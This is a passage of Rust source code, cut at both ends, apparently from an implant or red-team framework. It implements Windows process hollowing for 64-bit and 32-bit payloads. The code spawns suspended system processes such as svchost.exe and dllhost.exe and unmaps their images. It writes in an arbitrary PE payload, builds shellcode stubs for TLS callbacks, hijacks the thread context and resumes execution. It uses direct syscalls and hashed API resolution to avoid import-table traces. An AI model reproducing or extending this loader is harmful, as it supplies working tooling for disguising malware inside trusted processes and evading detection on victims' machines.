                                    );
                                } else {
                                    tracing::warn!(
                                        "hollow_and_execute: failed writing ProcessParameters UNICODE_STRING metadata (image={}, cmd={})",
                                        wrote_image,
                                        wrote_cmd
                                    );
                                }
                            }
                        }
                    }
                }
            }
        }

        // ── Collect TLS callbacks and .pdata from the hollowed payload ────
        // The Windows loader calls TLS callbacks before the entry point and
        // registers .pdata for structured exception unwinding.  Process
        // hollowing skips these steps, so payloads that rely on TLS callbacks
        // or SEH can crash or misbehave.  We build a shellcode stub that
        // performs this missing loader work before jumping to the entry point.
        //
        // Step 1: Enumerate TLS callback VAs from the PE's TLS directory.
        //   The TLS directory is in the local payload buffer; callbacks are
        //   VAs that need rebasing by +delta (same as relocations).
        let mut tls_callback_vas: Vec<usize> = Vec::new();
        {
            const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
            let tls_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
            if tls_dir.VirtualAddress != 0 && tls_dir.Size != 0 {
                let tls_rva = tls_dir.VirtualAddress as usize;
                if tls_rva + 40 <= image_size {
                    // IMAGE_TLS_DIRECTORY64 layout (40 bytes):
                    //   +0x00 StartAddressOfRawData : u64
                    //   +0x08 EndAddressOfRawData   : u64
                    //   +0x10 AddressOfIndex        : u64
                    //   +0x18 AddressOfCallBacks    : u64  <- VA of null-term array
                    //   +0x20 SizeOfZeroFill        : u32
                    //   +0x24 Characteristics       : u32
                    let tls_offset = rva_to_file_offset(tls_rva, nt);
                    if tls_offset + 32 <= payload.len() {
                        let callbacks_va_raw = u64::from_le_bytes(
                            payload[tls_offset + 24..tls_offset + 32]
                                .try_into()
                                .unwrap_or([0u8; 8]),
                        ) as usize;
                        if callbacks_va_raw != 0 {
                            // Rebase the VA by the same delta applied during
                            // relocation so it points into the remote image.
                            let callbacks_va = (callbacks_va_raw as isize + delta) as usize;
                            // Walk the callback array in the local payload.
                            // The array stores VAs that also need rebasing.
                            let mut remaining = 32u32; // defensive cap
                            let mut slot_idx = 0usize;
                            loop {
                                if remaining == 0 {
                                    break;
                                }
                                remaining -= 1;
                                // Each slot is 8 bytes (u64 VA on PE64).
                                // Convert the callbacks-array VA back to an RVA
                                // and then to a raw file offset via the section
                                // table — the payload buffer is the on-disk file
                                // image, so VAs cannot be used as indices directly.
                                let callbacks_rva = callbacks_va_raw.wrapping_sub(preferred_base);
                                let callbacks_file_offset = rva_to_file_offset(callbacks_rva, nt);
                                let slot_offset = callbacks_file_offset + slot_idx * 8;
                                if slot_offset + 8 > payload.len() {
                                    break;
                                }
                                let cb_va_raw = u64::from_le_bytes(
                                    payload[slot_offset..slot_offset + 8]
                                        .try_into()
                                        .unwrap_or([0u8; 8]),
                                ) as usize;
                                if cb_va_raw == 0 {
                                    break;
                                }
                                // Rebase and validate.
                                let cb_va = (cb_va_raw as isize + delta) as usize;
                                if cb_va >= remote_base && cb_va < remote_base + image_size {
                                    tls_callback_vas.push(cb_va);
                                }
                                slot_idx += 1;
                            }
                        }
                    }
                }
            }
        }

        // Step 2: Find the .pdata section for exception unwinding.
        // Use IMAGE_DIRECTORY_ENTRY_EXCEPTION (index 3) to get the
        // authoritative byte count of RUNTIME_FUNCTION entries.  The
        // section's SizeOfRawData can be larger (padded to
        // FileAlignment) or, for module_loader-style mapped images,
        // may not reflect the true exception table size.
        #[cfg(target_arch = "x86_64")]
        let (pdata_va, pdata_count) = {
            let mut result = (0usize, 0u32);
            const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
            let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
            if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
                let va = remote_base + exc_dir.VirtualAddress as usize;
                let count = (exc_dir.Size as usize / 12) as u32;
                if count > 0 {
                    result = (va, count);
                }
            }
            result
        };
        #[cfg(target_arch = "aarch64")]
        let (pdata_va, pdata_count) = {
            let mut result = (0usize, 0u32);
            const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
            let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
            if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
                let va = remote_base + exc_dir.VirtualAddress as usize;
                let count = (exc_dir.Size as usize / 12) as u32;
                if count > 0 {
                    result = (va, count);
                }
            }
            result
        };

        // Step 3: Resolve RtlAddFunctionTable from ntdll via PEB-walk.
        let rtl_add_fn_addr = if pdata_va != 0 && pdata_count != 0 {
            resolve_nt(b"RtlAddFunctionTable\0").unwrap_or(0)
        } else {
            0
        };

        let needs_stub = !tls_callback_vas.is_empty()
            || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);

        // Step 4: If we need a stub, build and inject it; otherwise jump
        // directly to the entry point as before.
        let thread_start_va = if needs_stub {
            // Build position-independent shellcode:
            //   (a) call RtlAddFunctionTable (if .pdata present)
            //   (b) call each TLS callback with (hinstDLL, DLL_PROCESS_ATTACH, NULL)
            //   (c) jump to the payload entry point
            let mut stub: Vec<u8> = Vec::with_capacity(256);

            #[cfg(target_arch = "x86_64")]
            {
                // ABI prologue: reserve 32 bytes of shadow space and keep RSP
                // 16-byte aligned.  At thread start RSP % 16 == 0, so
                // sub rsp, 0x20 keeps it aligned and provides the 4 × 8-byte
                // home area that every Windows x64 call requires.
                stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20

                // .pdata registration prologue.
                if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                    // mov rcx, pdata_va          (movabs rcx, imm64)
                    stub.extend_from_slice(&[0x48, 0xB9]);
                    stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
                    // mov edx, entry_count
                    stub.extend_from_slice(&[0xBA]);
                    stub.extend_from_slice(&pdata_count.to_le_bytes());
                    // mov r8, remote_base        (movabs r8, imm64)
                    stub.extend_from_slice(&[0x49, 0xB8]);
                    stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                    // mov rax, RtlAddFunctionTable (movabs rax, imm64)
                    stub.extend_from_slice(&[0x48, 0xB8]);
                    stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
                    // call rax
                    stub.extend_from_slice(&[0xFF, 0xD0]);
                }

                // TLS callback invocations.
                for &cb_va in &tls_callback_vas {
                    // mov rcx, remote_base       (hinstDLL)
                    stub.extend_from_slice(&[0x48, 0xB9]);
                    stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                    // mov edx, 1                 (DLL_PROCESS_ATTACH)
                    stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
                    // xor r8d, r8d               (lpvReserved = NULL)
                    stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
                    // mov rax, cb_va             (callback address)
                    stub.extend_from_slice(&[0x48, 0xB8]);
                    stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
                    // call rax
                    stub.extend_from_slice(&[0xFF, 0xD0]);
                }

                // ABI epilogue: restore the shadow space before jumping away.
                // add rsp, 0x20
                stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]);

                // Jump to the payload entry point.
                let entry_va = (remote_base + entry_point_rva) as u64;
                // mov rax, entry_va  (movabs rax, imm64)
                stub.extend_from_slice(&[0x48, 0xB8]);
                stub.extend_from_slice(&entry_va.to_le_bytes());
                // jmp rax
                stub.extend_from_slice(&[0xFF, 0xE0]);
            }

            #[cfg(target_arch = "aarch64")]
            {
                // ARM64 Windows ABI: no shadow space requirement; x0–x7 for
                // arguments, x16 (IP0) as the indirect-call scratch register.

                // .pdata registration.
                if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                    // RtlAddFunctionTable(PRUNTIME_FUNCTION, DWORD EntryCount, DWORD64 BaseAddress)
                    // x0 = pdata_va, x1 = count, x2 = remote_base
                    push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
                    push_arm64_mov_imm64(&mut stub, 1, pdata_count as u64);
                    push_arm64_mov_imm64(&mut stub, 2, remote_base as u64);
                    push_arm64_mov_imm64(&mut stub, 16, rtl_add_fn_addr as u64);
                    push_arm64_blr(&mut stub, 16);
                }

                // TLS callback invocations.
                for &cb_va in &tls_callback_vas {
                    push_arm64_dll_entry_call(&mut stub, cb_va as u64, remote_base as u64);
                }

                // Jump to the payload entry point (no return — use BR, not BLR).
                if entry_point_rva != 0 {
                    let entry_va = (remote_base + entry_point_rva) as u64;
                    push_arm64_mov_imm64(&mut stub, 16, entry_va);
                    push_arm64_br(&mut stub, 16);
                }
            }

            // Allocate RW memory for the stub in the target process.
            let mut stub_mem: *mut c_void = std::ptr::null_mut();
            let mut stub_alloc_size = stub.len();
            let alloc_s = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                h_process as u64,
                &mut stub_mem as *mut _ as u64,
                0u64,
                &mut stub_alloc_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64,
                PAGE_READWRITE as u64,
            )
            .unwrap_or(-1);
            if alloc_s < 0 || stub_mem.is_null() {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtAllocateVirtualMemory for TLS/pdata stub failed: {:#010x}",
                    alloc_s as u32
                ));
            }

            // Write the stub bytes.
            let mut stub_written = 0usize;
            let write_s = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_process as u64,
                stub_mem as u64,
                stub.as_ptr() as u64,
                stub.len() as u64,
                &mut stub_written as *mut _ as u64,
            )
            .unwrap_or(-1);
            if write_s < 0 || stub_written != stub.len() {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtWriteVirtualMemory for TLS/pdata stub failed: status={:#010x}, wrote={}, expected={}",
                    write_s as u32,
                    stub_written,
                    stub.len()
                ));
            }

            // Make the stub executable (RX).
            let mut prot_base = stub_mem;
            let mut prot_size = stub.len();
            let mut old_prot = 0u32;
            let prot_s = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                h_process as u64,
                &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                PAGE_EXECUTE_READ as u64,
                &mut old_prot as *mut _ as u64,
            )
            .unwrap_or(-1);
            if prot_s < 0 {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtProtectVirtualMemory(RX) for TLS/pdata stub failed: {:#010x}",
                    prot_s as u32
                ));
            }

            // Flush instruction cache for the stub.
            let _ = nt_syscall::syscall!(
                "NtFlushInstructionCache",
                h_process as u64,
                stub_mem as u64,
                stub.len() as u64,
            );

            tracing::debug!(
                "hollow_and_execute: injected TLS/pdata stub at {:p} ({} TLS callbacks, .pdata={} entries at {:#x})",
                stub_mem,
                tls_callback_vas.len(),
                pdata_count,
                pdata_va,
            );

            stub_mem as u64
        } else {
            // No TLS callbacks and no .pdata — jump directly to entry point.
            (remote_base + entry_point_rva) as u64
        };

        // Redirect the suspended thread's entry point to the hollowed payload
        // (or the TLS/pdata stub if loader work is needed).
        let mut ctx: windows_sys::Win32::System::Diagnostics::Debug::CONTEXT = zeroed();
        #[cfg(target_arch = "x86_64")]
        {
            ctx.ContextFlags = windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_AMD64;
        }
        #[cfg(target_arch = "aarch64")]
        {
            ctx.ContextFlags = windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_ARM64;
        }
        let get_ctx_status = nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        );
        match get_ctx_status {
            Ok(s) if s >= 0 => {
                #[cfg(target_arch = "x86_64")]
                {
                    ctx.Rip = thread_start_va;
                }
                #[cfg(target_arch = "aarch64")]
                {
                    ctx.Pc = thread_start_va;
                }
                let set_ctx_status = nt_syscall::syscall!(
                    "NtSetContextThread",
                    h_thread as u64,
                    &ctx as *const _ as u64,
                );
                match set_ctx_status {
                    Ok(s2) if s2 >= 0 => {}
                    Ok(s2) => {
                        nt_terminate_process!(h_process);
                        close_handle!(h_thread);
                        close_handle!(h_process);
                        return Err(anyhow!(
                            "hollow_and_execute: NtSetContextThread NTSTATUS {:#010x}",
                            s2 as u32
                        ));
                    }
                    Err(e) => {
                        nt_terminate_process!(h_process);
                        close_handle!(h_thread);
                        close_handle!(h_process);
                        return Err(anyhow!(
                            "hollow_and_execute: NtSetContextThread failed: {}",
                            e
                        ));
                    }
                }
            }
            Ok(s) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtGetContextThread NTSTATUS {:#010x}",
                    s as u32
                ));
            }
            Err(e) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtGetContextThread failed: {}",
                    e
                ));
            }
        }

        let resume_status = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        match resume_status {
            Ok(s) if s >= 0 => {}
            Ok(s) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtResumeThread NTSTATUS {:#010x}",
                    s as u32
                ));
            }
            Err(e) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!("hollow_and_execute: NtResumeThread failed: {}", e));
            }
        }

        close_handle!(h_thread);
        close_handle!(h_process);
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
    use std::mem::zeroed;
    use windows_sys::Win32::System::Diagnostics::Debug::{
        IMAGE_NT_HEADERS32, IMAGE_NT_OPTIONAL_HDR32_MAGIC, WOW64_CONTEXT, WOW64_CONTEXT_FULL,
    };
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    };
    use windows_sys::Win32::System::SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
    };
    // NtClose for handle cleanup.
    macro_rules! close_handle {
        ($h:expr) => {
            let _ = nt_syscall::syscall!("NtClose", $h as u64);
        };
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
    }
    let e_lfanew = checked_pe_lfanew(payload)?;
    checked_payload_range(
        payload.len(),
        e_lfanew,
        std::mem::size_of::<IMAGE_NT_HEADERS32>(),
        "PE32 NT headers",
    )?;

    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return Err(anyhow!("hollow_and_execute: invalid NT signature"));
    }
    let opt_magic = (*nt).OptionalHeader.Magic;
    if opt_magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC {
        return Err(anyhow!(
            "hollow_and_execute: expected PE32 payload (found OptionalHeader.Magic=0x{:x})",
            opt_magic
        ));
    }

    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
    let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
    let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
    if image_size == 0 {
        return Err(anyhow!(
            "hollow_and_execute: PE32 payload has SizeOfImage=0"
        ));
    }
    if entry_point_rva >= image_size {
        return Err(anyhow!(
            "hollow_and_execute: PE32 entry point RVA {entry_point_rva:#x} is outside image size {image_size:#x}"
        ));
    }
    checked_payload_range(payload.len(), 0, size_of_headers, "PE32 headers")?;
    if size_of_headers > image_size {
        return Err(anyhow!(
            "hollow_and_execute: PE32 SizeOfHeaders {size_of_headers:#x} exceeds SizeOfImage {image_size:#x}"
        ));
    }

    let image_end = (preferred_base as u64)
        .checked_add(image_size as u64)
        .ok_or_else(|| anyhow!("hollow_and_execute: PE32 image base+size overflow"))?;
    if image_end > (u32::MAX as u64 + 1) {
        return Err(anyhow!(
            "hollow_and_execute: PE32 image does not fit in 32-bit address space \
             (base={preferred_base:#x}, size={image_size:#x})"
        ));
    }

    // Resolve NT cross-process functions via direct syscalls — no Win32 IAT entries.
    macro_rules! nt_terminate {
        ($h:expr) => {
            let _ = nt_syscall::syscall!("NtTerminateProcess", $h as u64, 1u64);
        };
    }

    // Prefer SysWOW64 path for 32-bit host process; fall back through candidate list.
    // NOTE: we use create_suspended_wow64_process (CreateProcessW via PEB-walk)
    // instead of create_suspended_process_nt (NtCreateProcessEx) because the
    // latter always creates a 64-bit child when the parent is 64-bit, which
    // would produce the wrong bitness for PE32 hollowing.
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let candidates = vec![
        format!(r"{}\SysWOW64\svchost.exe", sysroot),
        format!(r"{}\SysWOW64\RuntimeBroker.exe", sysroot),
        format!(r"{}\SysWOW64\dllhost.exe", sysroot),
    ];
    let (h_process, h_thread) = {
        let mut result: Result<(*mut c_void, *mut c_void)> = Err(anyhow!(
            "hollow_and_execute(pe32): all WOW64 host process candidates failed"
        ));
        for path in &candidates {
            match create_suspended_wow64_process(path) {
                Ok(handles) => {
                    result = Ok(handles);
                    break;
                }
                Err(e) => tracing::debug!(
                    "hollow_and_execute(pe32): WOW64 candidate {} failed: {}",
                    path,
                    e
                ),
            }
        }
        result?
    };

    // Hollow original image via NtUnmapViewOfSection when possible.
    // Read the 32-bit PEB address (Ebx in WOW64 initial context).
    //
    // NOTE: NtGetContextThread / NtSetContextThread from a 64-bit caller cannot
    // correctly operate on WOW64 (32-bit) thread contexts.  We resolve
    // Wow64GetThreadContext / Wow64SetThreadContext from kernel32 via PEB-walk
    // instead.
    {
        // Resolve Wow64GetThreadContext once; fall back to NtGetContextThread
        // if kernel32 export is missing (should never happen on WOW64-capable
        // Windows, but keeps a graceful fallback path).
        let wow64_get_ctx: Option<
            unsafe extern "system" fn(*mut c_void, *mut WOW64_CONTEXT) -> i32,
        > = {
            let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
            match kernel32 {
                Some(k32) => {
                    let addr = pe_resolve::get_proc_address_by_hash(
                        k32,
                        pe_resolve::hash_str(b"Wow64GetThreadContext\0"),
                    );
                    addr.map(|a| std::mem::transmute(a))
                }
                None => None,
            }
        };

        let mut ctx: WOW64_CONTEXT = zeroed();
        ctx.ContextFlags = WOW64_CONTEXT_FULL;
        let get_ok = if let Some(wow64_get) = wow64_get_ctx {
            wow64_get(h_thread, &mut ctx) != 0
        } else {
            tracing::warn!(
                "hollow_and_execute(pe32): Wow64GetThreadContext not found; falling back to NtGetContextThread"
            );
            let get_ctx_status = nt_syscall::syscall!(
                "NtGetContextThread",
                h_thread as u64,
                &mut ctx as *mut _ as u64,
            );
            get_ctx_status.map_or(false, |s| s >= 0)
        };

        if get_ok {
            let peb_ptr = ctx.Ebx as usize as *const u8;
            let mut remote_image_base: u32 = 0;
            let mut rd: usize = 0;
            let _ = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                h_process as u64,
                peb_ptr.add(0x8) as u64,
                &mut remote_image_base as *mut _ as u64,
                std::mem::size_of::<u32>() as u64,
                &mut rd as *mut _ as u64,
            );
            if remote_image_base == 0 {
                tracing::warn!(
                    "hollow_and_execute(pe32): remote_image_base is NULL; skipping unmap"
                );
            } else {
                let us = nt_syscall::syscall!(
                    "NtUnmapViewOfSection",
                    h_process as u64,
                    remote_image_base as u64,
                )
                .unwrap_or(-1);
                if us < 0 {
                    tracing::warn!(
                        "hollow_and_execute(pe32): NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
                        us as u32);
                }
            }
        } else {
            tracing::warn!(
                "hollow_and_execute(pe32): Wow64GetThreadContext failed; skipping unmap"
            );
        }
    }

    // Allocate RW first; execute permissions applied per-section later.
    let mut alloc_base = preferred_base as *mut c_void;
    let mut alloc_size = image_size;
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_process as u64,
        &mut alloc_base as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    )
    .unwrap_or(-1);
    let remote_base_ptr = if s < 0 || alloc_base.is_null() {
        let mut fb: *mut c_void = std::ptr::null_mut();
        let mut fb_sz = image_size;
        let s2 = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_process as u64,
            &mut fb as *mut _ as u64,
            0u64,
            &mut fb_sz as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        )
        .unwrap_or(-1);
        if s2 < 0 || fb.is_null() {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "NtAllocateVirtualMemory failed for PE32 hollowing: {:#010x}",
                s2 as u32
            ));
        }
        fb
    } else {
        alloc_base
    };

    let remote_base = remote_base_ptr as usize;
    let remote_base32 = u32::try_from(remote_base).map_err(|_| {
        anyhow!("hollow_and_execute: allocated PE32 base above 4GB ({remote_base:#x})")
    })?;
    let mut written: usize = 0;

    if nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_process as u64,
        remote_base_ptr as u64,
        payload.as_ptr() as u64,
        size_of_headers as u64,
        &mut written as *mut _ as u64,
    )
    .unwrap_or(-1)
        < 0
        || written != size_of_headers
    {
        nt_terminate!(h_process);
        close_handle!(h_thread);
        close_handle!(h_process);
        return Err(anyhow!(
            "NtWriteVirtualMemory(headers, pe32) failed: wrote={}, expected={}",
            written,
            size_of_headers
        ));
    }

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS32>())
        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let raw_off = sec.PointerToRawData as usize;
        let raw_sz = sec.SizeOfRawData as usize;
        if raw_sz == 0 {
            continue;
        }
        if raw_off == 0 {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): section {} has SizeOfRawData={:#x} but PointerToRawData=0",
                i,
                raw_sz
            ));
        }

        let section_rva = sec.VirtualAddress as usize;
        if section_rva >= image_size {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): section {} RVA {:#x} is outside image size {:#x}",
                i,
                section_rva,
                image_size
            ));
        }

        let max_in_image = image_size - section_rva;
        if raw_sz > max_in_image {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): section {} raw size {:#x} exceeds mapped image bounds at RVA {:#x} (remaining {:#x})",
                i,
                raw_sz,
                section_rva,
                max_in_image
            ));
        }

        let raw_end = match raw_off.checked_add(raw_sz) {
            Some(v) => v,
            None => {
                nt_terminate!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute(pe32): section {} raw range overflow (offset={:#x}, size={:#x})",
                    i,
                    raw_off,
                    raw_sz
                ));
            }
        };
        if raw_end > payload.len() {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): section {} raw range [{:#x}, {:#x}) exceeds payload size {:#x}",
                i,
                raw_off,
                raw_end,
                payload.len()
            ));
        }

        let copy_sz = raw_sz;
        let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        if nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64,
            dst as u64,
            payload.as_ptr().add(raw_off) as u64,
            copy_sz as u64,
            &mut written as *mut _ as u64,
        )
        .unwrap_or(-1)
            < 0
            || written != copy_sz
        {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "NtWriteVirtualMemory(section {}, pe32) failed: wrote={}, expected={}",
                i,
                written,
                copy_sz
            ));
        }
    }

    let delta = remote_base as isize - preferred_base as isize;
    if delta != 0 {
        let reloc_dir = &(*nt).OptionalHeader.DataDirectory
            [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC
                as usize];
        if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): preferred base unavailable and PE has no reloc directory"));
        }
        apply_relocations_remote32(h_process, remote_base, nt, payload, delta)?;
    }

    fix_iat_remote32(h_process, remote_base, nt, payload, &mut written)?;
    apply_section_protections32(h_process, remote_base, nt);

    // ── Collect TLS callbacks from the PE32 payload ──────────────────
    // PE32 TLS directory layout (IMAGE_TLS_DIRECTORY32, 24 bytes):
    //   +0x00 StartAddressOfRawData : u32
    //   +0x04 EndAddressOfRawData   : u32
    //   +0x08 AddressOfIndex        : u32
    //   +0x0C AddressOfCallBacks    : u32  <- VA of null-terminated callback array
    //   +0x10 SizeOfZeroFill        : u32
    //   +0x14 Characteristics       : u32
    let mut tls_callback_vas32: Vec<u32> = Vec::new();
    {
        const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
        let tls_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if tls_dir.VirtualAddress != 0 && tls_dir.Size != 0 {
            let tls_rva = tls_dir.VirtualAddress as usize;
            let tls_offset = rva_to_file_offset32(tls_rva, nt);
            if tls_rva + 24 <= image_size && tls_offset + 20 <= payload.len() {
                let callbacks_va_raw = u32::from_le_bytes(
                    payload[tls_offset + 12..tls_offset + 16]
                        .try_into()
                        .unwrap_or([0u8; 4]),
                ) as usize;
                if callbacks_va_raw != 0 {
                    // Rebase VA by delta.
                    let _callbacks_va_rebased = (callbacks_va_raw as isize + delta) as usize;
                    // Walk callback array in the local payload.
                    // Convert the callbacks-array VA back to an RVA and then
                    // to a raw file offset — the payload buffer is the on-disk
                    // image, so VAs cannot be used as buffer indices directly.
                    let callbacks_rva = callbacks_va_raw.wrapping_sub(preferred_base);
                    let callbacks_file_offset = rva_to_file_offset32(callbacks_rva, nt);
                    let mut remaining = 32u32;
                    let mut slot_idx = 0usize;
                    loop {
                        if remaining == 0 {
                            break;
                        }
                        remaining -= 1;
                        let slot_offset = callbacks_file_offset + slot_idx * 4;
                        if slot_offset + 4 > payload.len() {
                            break;
                        }
                        let cb_va_raw = u32::from_le_bytes(
                            payload[slot_offset..slot_offset + 4]
                                .try_into()
                                .unwrap_or([0u8; 4]),
                        ) as usize;
                        if cb_va_raw == 0 {
                            break;
                        }
                        let cb_va = (cb_va_raw as isize + delta) as u32;
                        if (cb_va as usize) >= remote_base
                            && (cb_va as usize) < remote_base + image_size
                        {
                            tls_callback_vas32.push(cb_va);
                        }
                        slot_idx += 1;
                    }
                }
            }
        }
    }

    let needs_stub32 = !tls_callback_vas32.is_empty();

    // Build a 32-bit shellcode stub for TLS callbacks if needed, then
    // set Eax to the stub address (or the entry point directly if no stub).
    let thread_start_eax = if needs_stub32 {
        let mut stub: Vec<u8> = Vec::with_capacity(256);
        // 32-bit x86 position-independent shellcode:
        //   for each TLS callback:
        //     push 0                   ; lpvReserved = NULL
        //     push 1                   ; fdwReason = DLL_PROCESS_ATTACH
        //     push <remote_base32>     ; hinstDLL
        //     mov eax, <callback_va>
        //     call eax
        //   then:
        //     push <remote_base32 + entry_point_rva>
        //     ret                      ; jump to entry point
        for &cb_va in &tls_callback_vas32 {
            // push 0 (lpvReserved)
            stub.extend_from_slice(&[0x6A, 0x00]);
            // push 1 (DLL_PROCESS_ATTACH)
            stub.extend_from_slice(&[0x6A, 0x01]);
            // push remote_base32 (hinstDLL)
            stub.extend_from_slice(&[0x68]);
            stub.extend_from_slice(&remote_base32.to_le_bytes());
            // mov eax, cb_va
            stub.extend_from_slice(&[0xB8]);
            stub.extend_from_slice(&cb_va.to_le_bytes());
            // call eax
            // Note: no caller cleanup — PIMAGE_TLS_CALLBACK is WINAPI
            // (__stdcall) on x86, so the callee pops its own 3 DWORD args.
            stub.extend_from_slice(&[0xFF, 0xD0]);
        }
        // Push the entry point address and ret to jump there.
        let entry_va32 = remote_base32.wrapping_add(entry_point_rva as u32);
        stub.extend_from_slice(&[0x68]);
        stub.extend_from_slice(&entry_va32.to_le_bytes());
        stub.extend_from_slice(&[0xC3]); // ret

        // Allocate RW memory for the stub.
        let mut stub_mem: *mut c_void = std::ptr::null_mut();
        let mut stub_alloc_size = stub.len();
        let alloc_s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_process as u64,
            &mut stub_mem as *mut _ as u64,
            0u64,
            &mut stub_alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        )
        .unwrap_or(-1);
        if alloc_s < 0 || stub_mem.is_null() {
            nt_terminate!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute(pe32): NtAllocateVirtualMemory for TLS stub failed: {:#010x}",
                alloc_s as u32
            ));
        }

        // Write stub.
        let mut stub_written = 0usize;
        let write_s = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64,
            stub_mem as u64,
            stub.as_ptr() as u64,
